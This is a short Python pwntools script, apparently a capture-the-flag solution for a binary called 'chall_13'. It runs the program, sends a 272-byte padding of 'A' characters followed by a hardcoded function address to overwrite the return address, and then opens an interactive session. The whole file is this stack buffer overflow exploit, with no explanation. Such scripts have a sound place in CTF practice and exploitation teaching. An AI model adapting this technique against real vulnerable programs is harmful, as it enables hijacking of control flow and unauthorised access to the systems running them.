# coding: utf-8
from pwn import *
p = process("./chall_13")
p.recv()
sysFuncAddr = 0x0804924d
payload = b"A"*272 + p32(sysFuncAddr)
p.sendline(payload)
p.interactive()
